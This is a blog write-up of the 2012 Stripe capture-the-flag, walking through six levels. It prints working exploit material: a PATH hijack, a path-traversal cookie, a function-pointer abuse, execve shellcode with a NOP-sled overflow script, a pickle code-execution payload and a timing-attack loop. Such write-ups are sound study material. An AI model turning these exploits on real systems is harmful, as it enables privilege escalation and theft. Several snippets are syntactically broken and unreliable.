Title: The First Stripe CTF
Date: 2014-11-24 4:20
Category: Vulnerabilities
Tags: SQLi, PHP, Wargames, CTF, Burp, curl, assembly, shellcode, gdb, C, objdump, Timing_attack, Buffer_overflow, Stack_overflow, Python, Stripe


Although I did not have the chance of playing in either of the [three](https://stripe.com/blog/capture-the-flag) [Stripe](https://stripe.com/blog/capture-the-flag-20) [CTFs](https://stripe.com/blog/ctf3-launch), I was quite enthralled when I took a look at the problems. I decided to solve them anyway, and I am writing this series of writeups.


This post is about the first [Stripe](https://stripe.com/) CTF, which [happened at the beginning of 2012](https://stripe.com/blog/capture-the-flag-wrap-up). I was able to fully reproduce the game by using a [Live CD Image](http://www.janosgyerik.com/hacking-contest-on-a-live-cd/). Other options were [direct download and BitTorrent](https://stripe.com/blog/capture-the-flag-wrap-up).

This CTF was composed of 6 levels, and its style was very similar to other Wargames I've talked about before in this blog (for instance, check [OverTheWire's](http://overthewire.org/wargames/) [Natas](http://singularity-sh.vercel.app/exploiting-the-web-in-20-lessons-natas.html), [Narnia](http://singularity-sh.vercel.app/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html), and [Krypton](http://singularity-sh.vercel.app/cryptography-war-beating-krypton.html)).



---
## Level 1: Environment Variables

When I booted the image, I got this first message:

![cyber](http://i.imgur.com/O9ixhUv.jpg)

In the *level01* folder I found:

* A [setuid](http://linux.die.net/man/2/setuid) binary (a binary with access rights that allow users to run executables with permissions of the owner or the group).

* The C source code of this binary:

![cyber](http://i.imgur.com/DgB55I8.jpg)

Checking the code closely we notice the following lines:
```
 printf("Current time: ");
 fflush(stdout);
 system("date");
```

A vulnerability becomes quite obvious!

First, if you use ```printf``` to send a text without a trailing ```\n``` to **stdout** (the screen), there is no guarantee that any of the text will appear so [fflush](http://man7.org/linux/man-pages/man3/fflush.3.html) is used to write everything that is buffered to **stdout**.

Second, ```system``` executes [any shell command you pass to it](http://linux.die.net/man/3/system). In the case above, it will find a command through the [PATH environment variable](http://en.wikipedia.org/wiki/PATH_%28variable%29).

It's clear that if we manage to change the variable ```date``` to some controlled exploit (such as ```cat /home/level01/.password```) we get the program to print the password.

Third, ```system``` outputs the date using a **relative path** for the **PATH**. We just need to change that to the directory where we keep our exploit (*e.g.*, ```pwd```) to have the system *forget* about the original date function.

 The final script that leads to the next level's password looks like this:

```
#!/bin/sh
cd /tmp
echo '/bin/cat /home/level01/.password > date'
chmod +x date
export PATH=`pwd`:$PATH
/levels/level01/level01
```

---
## Level 2: Client's Cookies

This level is about finding a vulnerability in a PHP script that greets the user with her/his saved data.

The program implements this functionality by setting a cookie that saves the user's username and age. In future visits to the page, the program is then able to print *You’re NAME, and your age is AGE*.

Inspecting closely the code we see that the client's cookie is read without sanitizing its content:

```
<?php
 $out = '';
 if (!isset($_COOKIE['user_details'])) {
 setcookie('user_details', $filename);
 }
 else {
 $out = file_get_contents('/tmp/level02/'.$_COOKIE['user_details']);
 }
?>
```
And then the results of this read is printed:
```
<html>
 <p><?php echo $out ?></p>
</html>
```

An obvious way to exploit this vulnerability is by building our own [request](http://www.w3.org/Protocols/rfc2616/rfc2616-sec5.html) that makes the program read the password at */home/level02/.password*.

The cookie is set in the client side so we have lots of freedom to exploit it. For instance, we could use [Burp Suite](http://portswigger.net/burp/) to intercept the request and add the crafted cookie header. We could also use [Chrome Webinspector](https://chrome.google.com/webstore/detail/web-inspector/enibedkmbpadhfofcgjcphipflcbpelf?hl=en) to copy the [Authorization header](http://en.wikipedia.org/wiki/Basic_access_authentication) for the same purpose. The Cookie header would look like:

```
Cookie: user_details=../../home/level02/.password
```

Interestingly, it is also possible to solve this problem with just one instruction in the command line:

```
$ curl --user level01:$(cat /home/level01/.password) --digest -b "user_details=../../home/level02/.password" localhost:8002/level02.php
```

Where the flag **--digest** enables HTTP authentication, and the flags **-b** or **--cookie** let us determine the cookie to be sent.

Note: In the LiveCD this level is modified to use Python and [Flask](http://flask.pocoo.org/docs/0.10/). Luckily, I had some previous experience in Flask (check out my [Anti-Social Network]()) and it was pretty easy to spot that the Pyhton code does *exactly* the same thing as the one above.



---
## Level 3: Failure in Input Validation

The third level comes with another **setuid** binary with the purpose of modifying a string:

```
$ /levels/level03
 Usage: ./level03 INDEX STRING
 Possible indices:
 [0] to_upper [1] to_lower
 [2] capitalize [3] length
```

The C code is also given:

```

#define NUM_FNS 4

typedef int (*fn_ptr)(const char *);

int to_upper(const char *str)
{(...)}

int to_lower(const char *str)
{(...)}

int capitalize(const char *str)
{(...)}

int length(const char *str)
{(...)}

int run(const char *str)
{
 // This function is now deprecated.
 return system(str);
}

int truncate_and_call(fn_ptr *fns, int index, char *user_string)
{
 char buf[64];
 // Truncate supplied string
 strncpy(buf, user_string, sizeof(buf) - 1);
 buf[sizeof(buf) - 1] = '\0';
 return fns[index](buf);
}

int main(int argc, char **argv)
{
 int index;
 fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};

 if (argc != 3) {
 printf("Usage: ./level03 INDEX STRING\n");
 printf("Possible indices:\n[0] to_upper\t[1] to_lower\n");
 printf("[2] capitalize\t[3] length\n");
 exit(-1);
 }

 // Parse supplied index
 index = atoi(argv[1]);

 if (index >= NUM_FNS) {
 printf("Invalid index.\n");
 printf("Possible indices:\n[0] to_upper\t[1] to_lower\n");
 printf("[2] capitalize\t[3] length\n");
 exit(-1);
 }

 return truncate_and_call(fns, index, argv[2]);
}
```

In problems like this, the attack surface is usually any place where there is input from the user. For this reason, our approach is to take a look at the arguments taken in the main function, checking for the common memory and overflow vulnerabilities in C.

A vulnerability is found in the failure of checking for negative inputs:

```
#define NUM_FNS 4
(...)
 // Parse supplied index
 index = atoi(argv[1]);
 if (index >= NUM_FNS) {
 (...)
 exit(-1);
}
```

Moreover, the **index** variable is used in the function **truncate_and_call**, where the function **fns** can be overflowed:

```
typedef int (*fn_ptr)(const char *);
(...)
fn_ptr fns[NUM_FNS] = {&to_upper, &to_lower, &capitalize, &length};
(...)
int truncate_and_call(fn_ptr *fns, int index, char *user_string)
{
 char buf[64];
 // Truncate supplied string
 strncpy(buf, user_string, sizeof(buf) - 1);
 buf[sizeof(buf) - 1] = '\0';
 return fns[index](buf);
}
```

The exploitation plan becomes easier when we notice that right before **truncate_and_call** we have this convenient function:

```
int run(const char *str)
{
 return system(str);
}
```



### Description of the Exploit

To understand this problem we need to understand the [design of the stack frame](http://singularity-sh.vercel.app/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html). With this in mind, the exploit is crafted as follows:

1) We input a malicious index that is negative (so it pass the bound checking) to have a shell running ```system("/bin/sh");``` (which will be able to read password of level3 because it will have its [UID](http://en.wikipedia.org/wiki/User_identifier_(Unix))).


2) We first need to find the memory location before **fns** (which should be writable). We fire up **gdb** and search for the pointer to **buf**, which is right before **fns** (this is different each time due to [ASLR](http://en.wikipedia.org/wiki/Address_space_layout_randomization)):

```
(gdb) p &buf
 (char (*)[64]) 0xffbffa00
```

3) We check **index** (where 4 is **sizeof(*fns)**), and subtract **buf** from to the pointer to **fns**:

```
(gdb) p (0xffbffa6c - 0xffbffa00)/4
 27
```
So running an argument such as */level/level03 -27 foo* calls **fns[-27]** which is **&fns-27** times the size of the pointer.


4) We will assign **buf** to a shellcode that will spawn the privileged terminal using the function **run**, which is at:

```
(gdb) p &run
 (int (*)(const char *)) 0x80484ac
```

5) Stripe's machines were [little-endian](http://en.wikipedia.org/wiki/Endianness) so the address of **run** is **\xac\x84\x04\x08**. We write the memory location of **&run** into **buf**, since **buf** is just a ```strcpy``` of the second argument. In the end, we want to call:

```
$ run('\xac\x84\x04\x08');
```

6) Running it with the length of the directory (remember that the function pointer must start on a multiple of 4 characters) gives our password:

```
$ /levels/level03 -21 "cat /home/level03/.password $(printf '\xac\x84\x04\x08')
```




---
## Level 4: Classic Stack Overflow

Level 4 is about a classical Stack Overflow problem. Once again we get a **setuid** binary, together with the following code:

```
void fun(char *str)
{
 char buf[1024];
 strcpy(buf, str);
}

int main(int argc, char **argv)
{
 if (argc != 2) {
 printf("Usage: ./level04 STRING");
 exit(-1);
 }
 fun(argv[1]);
 printf("Oh no! That didn't work!\n");
 return 0;
}
```

In this challenge, the input string is received by the function **fun**, and then it is copied to the buffer. Since ```strcp``` does not perform bounds checking, if our string is larger than 1024 characters, it will keep copying until it reaches a NULL byte (0x00). This [overflows the stack](http://phrack.org/issues/49/14.html#article) and makes it possible to rewrite the **function return address**.

The input for the **fun** function is going to be 1024 bytes (which starts at **&buf**) with several [NOPs](http://en.wikipedia.org/wiki/NOP) plus the shellcode. The overflowed bytes have pointers to the address of **buf** (**&buf**). We use NOPs because the system uses stack randomization. If **&buf** points to any of the NOPs, the shellcode will be executed.


### Yet Another Shellcode Introduction

Shellcode can either be crafted directly in Assembly or reproduced in C and then disassembled in **gdb** and **objdump**. The second approach is more prone to errors.

Let's write the simplest shellcode we can think of, which simply spawns a shell:

```
#include <stdlib.h>
int main()
{
 char *array[2];
 array[0] = "/bin/sh";
 array[1] = NULL;
 execve(array[0], array, NULL);
 exit(0);
}
```

With the following **Makefile** (I tend to write Makefiles for anything I compile in C):
```
shell: simplest_shellcode.c
 gcc -static -g -o shell simplest_shellcode.c
```

Running **make** will give us our executable **shell**. Now, let's fire up **gdb**:

```
$ gdb shell
(gdb) disas main
Dump of assembler code for function main:
 0x00000000004004d0 <+0>: push %rbp
 0x00000000004004d1 <+1>: mov %rsp,%rbp
 0x00000000004004d4 <+4>: sub $0x10,%rsp
 0x00000000004004d8 <+8>: movq $0x482be4,-0x10(%rbp)
 0x00000000004004e0 <+16>: movq $0x0,-0x8(%rbp)
 0x00000000004004e8 <+24>: mov -0x10(%rbp),%rax
 0x00000000004004ec <+28>: lea -0x10(%rbp),%rcx
 0x00000000004004f0 <+32>: mov $0x0,%edx
 0x00000000004004f5 <+37>: mov %rcx,%rsi
 0x00000000004004f8 <+40>: mov %rax,%rdi
 0x00000000004004fb <+43>: callq 0x40c540 <execve>
 0x0000000000400500 <+48>: mov $0x0,%edi
 0x0000000000400505 <+53>: callq 0x400e60 <exit>
End of assembler dump.
```

The first line is updating the frame stack pointer (**%rsp**), moving it to the top of the stack:
```
0x00000000004004d0 <+0>: push %rbp
0x00000000004004d1 <+1>: mov %rsp,%rbp
```


Then it subtracts 16 bytes from **%rsp**, with 8 bytes of padding:
```
0x00000000004004d4 <+4>: sub $0x10,%rsp
```

We see this address **0x482be4** being moved to **%rsp**:
```
0x00000000004004d8 <+8>: movq $0x482be4,-0x10(%rbp)
```

It should be a pointer to ```/bin/sh```, and we can be sure by asking gdb:
```
(gdb) x/1s 0x482be4
0x482be4: "/bin/sh"
```

After that, **NULL** is pushed in:
```
0x00000000004004f0 <+32>: mov $0x0,%edx
```

Finally, **execve** is executed:
```
0x00000000004004fb <+43>: callq 0x40c540 <execve>
```

### Writing the Shellcode in Assembly

Now we are able to reproduce the code in Assembly. This is important: Stripe's machine was 32-bit, and the Assembly instructions are different from 64-bit (for instance, check the 64-bit shellcode I showed [here](http://singularity-sh.vercel.app/smashing-the-stack-for-fun-or-wargames-narnia-0-4.html)).

With an **l** added to the words, the above shellcode in 32-bit machines is:

```
.text
.globl _start

_start:
 xorl %eax, %eax /* make eax equal to 0*/
 pushl %eax /* pushes null*/
 pushl $0x68732f2f /* push //sh */
 pushl $0x6e69622f /* push /bin */
 movl %esp, %ebx /* store /bin/sh */
 pushl %eax /* use null*/
 pushl %ebx /* use /bin/sh*/
 movl %esp, %ecx /* wrutes array */
 xorl %edx, %edx /* xor to make edx equal to 0 */
 movb $0xb, %al /* execve system call #11 */
 int $0x80 /* make an interrupt */
```

To assemble and link this in a 32-bit machine, we do:

```
$ as -o shell.o shell.s
$ ld -m -o shell shell.o
```

In a 64-but machine, we do:

1. Add **.code32** in the top of the Assembly code.
2. Assemble with the **--32 flag**.
3. Link with the **-m elf_i386** flag.

Resulting in:

```
$ as --32 -o shell.o shell.s
$ ld -m elf_i386 -o shell shell.o
```

Now, the last step is to get the executable **shell** in hexadecimal so we have the instructions for the shellcode. We use **objdump**:

```
$ objdump -d shell
shell: file format elf32-i386
Disassembly of section .text:
08048054 <_start>:
 8048054: 31 c0 xor %eax,%eax
 8048056: 50 push %eax
 8048057: 68 2f 2f 73 68 push $0x68732f2f
 804805c: 68 2f 62 69 6e push $0x6e69622f
 8048061: 89 e3 mov %esp,%ebx
 8048063: 50 push %eax
 8048064: 53 push %ebx
 8048065: 89 e1 mov %esp,%ecx
 8048067: 31 d2 xor %edx,%edx
 8048069: b0 0b mov $0xb,%al
 804806b: cd 80 int $0x80
```

Which in the little-endian representation is:
```
\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80
```


### Solving the Problem

Now, all we need to do is write a snippet in any language which takes that shellcode and some NOPs to overflow the stack of the *level04*'s' binary. We write the exploit in Python:

```py
import struct, subprocess

STACK = 0x0804857b
NOP = \x90
SHELLCODE = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
EXPLOIT = NOP * (1024 - len(SHELLCODE)) + SHELLCODE

stack_ptr = struct.pack("<I", STACK) * 500
array = "%s%s" % (EXPLOIT, stack_ptr)

while 1:
 subprocess.call(["/levels/level04", array])
```
This solution is possible due to the [struct](https://docs.python.org/2/library/struct.html) module, which performs a conversion between Python and C values, and the [subprocess](https://docs.python.org/2/library/subprocess.html) module, which allows us to spawn new processes. The **struct.pack** method returns a string containing the values packet in the specified format (where **<** means little-endian and **I** is unsigned int).

A [one-line solution in Ruby](https://github.com/stripe-ctf), was given by Stripe and it's worth to mention:

```
$ ruby -e 'print "\xeb\x1a\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x41\x41\x41\x41\x42\x42\x42\x42" + "\x90"*987 + "\x7b\x85\x04\x08"'
```





---
## Level 5: Unpickle exploit

The fifth level is a uppercasing **web service** written in Python, which is split into an HTTP part, and a worker queue part.

In this service, a request can be sent with:

```
$ curl localhost:9020 -d 'banana'
{
 "processing_time": 5.0037501611238511e-06,
 "queue_time": 0.4377421910476061,
 "result": "BANANA"
}
```

After inspecting the code, we concentrate in the suspicious **deserialize** function that contains the unsafe module [pickle](https://docs.python.org/2/library/pickle.html):

```py
def deserialize(serialized):
 logger.debug('Deserializing: %r' % serialized)
 parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
 match = parser.match(serialized)
 direction = match.group(1)
 data = match.group(2)
 job = pickle.loads(match.group(3))
 return direction, data, job
```

This is used later in the **serialize** function:

```py
@staticmethod
def serialize(direction, data, job):
 serialized = """type: %s; data: %s; job: %s""" % (direction, data, pickle.dumps(job))
 logger.debug('Serialized to: %r' % serialized)
 return serialized
```

So, the program serializes jobs with pickle and sends them to a series of workers to deserialize and process the job. Once again, the attack surface is in the user input, which is not properly sanitized: this function allows arbitrary data to be sent to **; job**.

We can exploit it by making the serialization code execute arbitrary commands by supplying a string such as **; job: <pickled>**. This will run some Python code that will give us the password when unpickled. A great module for this task is [Python's os.system](https://docs.python.org/2/library/os.html#os.system), which executes commands in a subshell.



An example of exploit in Python is the following:

```py
import pickle, os
HOST = 'localhost:9020'

os.system("/usr/bin/curl", ['', HOST, '-d', \
 "bla; job: cos\nsystem\n(S'cat /home/level05/.password \
 > /tmp/pass'\ntR."], {})
```





---
## Level 6: Timing Attack


And we have reached the sixth level!

The goal in this level is to read the password from */home/the-flag/.password*. To complete this challenge, another **setuid** binary is given, which can be used to guess the password:

```
$ ./level06 /home/the-flag/.password banana
 Welcome to the password checker!
$ Ha ha, your password is incorrect!
```

This turns out to be a case of [Timing Attack](http://en.wikipedia.org/wiki/Timing_attack), where we are able to detect the output in **stderr** and in **stdout** to find the characters that form the password (by checking the response to wrong characters).

But there is a twist!

The program works as the following: for every input character, a loop is executed. A dot is printed after each character comparison. If the guess is wrong, the system forks a child process and runs a little slower (each loop has complexity O(n^2) to the guess size, where the maximum size is **MAX_ARG_STRLEN ~ 0.1 MB**).


There are several [elegant solutions in the Internet](https://github.com/stripe-ctf/stripe-ctf/blob/master/code/level06/level06.c), but a very simple possible shell exploit is the shown:

```
#!\bin\bash
for c in {A..Z} {a..z} {0..9}; do
echo $c
head -c35 file & sleep 0.1
/levels/level06 /home/the-flag/.password "$c"A 2> file
done
```

**And we get our flag! Fun! :) **


---

## References

* [Andy Brody's Post](https://stripe.com/blog/capture-the-flag-wrap-up)
* [Stripe CTF Repository](https://github.com/stripe-ctf)
* Pickle Modules is unsafe! [Here](https://blog.nelhage.com/2011/03/exploiting-pickle/) and [here](http://penturalabs.wordpress.com/2011/03/17/python-cpickle-allows-for-arbitrary-code-execution/).
* Some other writeups: [here](http://blog.delroth.net/2012/03/my-stripe-ctf-writeup/), [here](https://khr0x40sh.wordpress.com/2012/02/), [here](http://du.nham.ca/blog/posts/2012/03/20/stripe-ctf/), and [here](https://isisblogs.poly.edu/2012/03/23/stripe-ctf-level01/).


